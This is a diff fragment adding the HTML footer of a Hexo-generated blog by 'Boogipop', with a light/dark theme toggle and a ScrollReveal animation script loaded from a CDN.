+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
